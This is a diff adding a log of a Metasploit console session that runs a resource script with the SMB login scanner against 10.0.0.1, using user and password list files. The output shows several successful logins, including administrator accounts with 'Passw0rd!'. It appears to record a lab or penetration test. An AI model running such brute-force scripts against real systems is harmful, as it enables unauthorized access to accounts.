@@ -1,0 +1,64 @@
+
+ ______________________________________________________________________________
+|                                                                              |
+|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
+|______________________________________________________________________________|
+      \                                  /                      /
+       \     .                          /                      /            x
+        \                              /                      /
+         \                            /          +           /
+          \            +             /                      /
+           *                        /                      /
+                                   /      .               /
+    X                             /                      /            X
+                                 /                     ###
+                                /                     # % #
+                               /                       ###
+                      .       /
+     .                       /      .            *           .
+                            /
+                           *
+                  +                       *
+
+                                       ^
+####      __     __     __          #######         __     __     __        ####
+####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
+################################################################################
+################################################################################
+# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
+################################################################################
+                                                           https://metasploit.com
+
+
+       =[ metasploit v6.2.11-dev                          ]
++ -- --=[ 2233 exploits - 1179 auxiliary - 398 post       ]
++ -- --=[ 867 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Search can apply complex filters such as 
+search cve:2009 type:exploit, see all the filters 
+with help search
+
+[*] Processing smb_enum.rc for ERB directives.
+resource (smb_enum.rc)> use auxiliary/scanner/smb/smb_login
+resource (smb_enum.rc)> set rhosts 10.0.0.1
+rhosts => 10.0.0.1
+resource (smb_enum.rc)> set user_file victimuser.lst
+user_file => victimuser.lst
+resource (smb_enum.rc)> set pass_file victimpassword.lst
+pass_file => victimpassword.lst
+resource (smb_enum.rc)> exploit
+[*] 10.0.0.1:445          - 10.0.0.1:445 - Starting SMB login bruteforce
+[+] 10.0.0.1:445          - 10.0.0.1:445 - Success: '.\administrator:Passw0rd!'
+[!] 10.0.0.1:445          - No active DB -- Credential data will not be saved!
+[+] 10.0.0.1:445          - 10.0.0.1:445 - Success: '.\Administrator:Passw0rd!'
+[-] 10.0.0.1:445          - 10.0.0.1:445 - Failed: '.\admin:Passw0rd!',
+[-] 10.0.0.1:445          - 10.0.0.1:445 - Failed: '.\admin:Passw0rd',
+[-] 10.0.0.1:445          - 10.0.0.1:445 - Failed: '.\admin:P@ssw0rd!',
+[+] 10.0.0.1:445          - 10.0.0.1:445 - Success: '.\leonard:Passw0rd!'
+[-] 10.0.0.1:445          - 10.0.0.1:445 - Failed: '.\:Passw0rd!',
+[-] 10.0.0.1:445          - 10.0.0.1:445 - Failed: '.\:Passw0rd',
+[-] 10.0.0.1:445          - 10.0.0.1:445 - Failed: '.\:P@ssw0rd!',
+[*] 10.0.0.1:445          - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+resource (smb_enum.rc)> exit
